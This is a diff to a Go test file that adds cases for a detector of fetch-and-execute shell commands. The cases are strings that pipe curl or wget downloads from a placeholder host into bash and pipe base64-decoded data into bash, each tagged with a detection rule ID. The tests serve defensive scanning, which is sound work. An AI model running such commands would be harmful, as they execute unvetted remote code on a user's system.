@@ -205,6 +205,35 @@ func TestExactFallbackContractsRequireExecutableStructure(t *testing.T) {
 			want:    true,
 		},
 		{
+			name:    "curl to bash plus shell option",
+			ruleID:  "CMD-PIPE-CURL",
+			command: `curl https://files.invalid/install.sh | bash +e; "$runner"`,
+			want:    true,
+		},
+		{
+			name:    "curl to bash final noexec",
+			ruleID:  "CMD-PIPE-CURL",
+			command: `curl https://files.invalid/install.sh | bash +n -n; "$runner"`,
+		},
+		{
+			name:    "curl joined data operand to shell",
+			ruleID:  "CMD-PIPE-CURL",
+			command: `curl -dfoo https://files.invalid/run | bash; "$runner"`,
+			want:    true,
+		},
+		{
+			name:    "wget joined timeout to shell",
+			ruleID:  "CMD-PIPE-WGET",
+			command: `wget -T10s -O- https://files.invalid/run | bash; "$runner"`,
+			want:    true,
+		},
+		{
+			name:    "base64 repeated decode bundle to shell",
+			ruleID:  "CMD-PIPE-BASE64",
+			command: `base64 -dd | bash; "$runner"`,
+			want:    true,
+		},
+		{
 			name:    "curl to shell prose",
 			ruleID:  "CMD-PIPE-CURL",
 			command: `printf '%s\n' 'curl https://files.invalid/install.sh | sh'; "$runner"`,
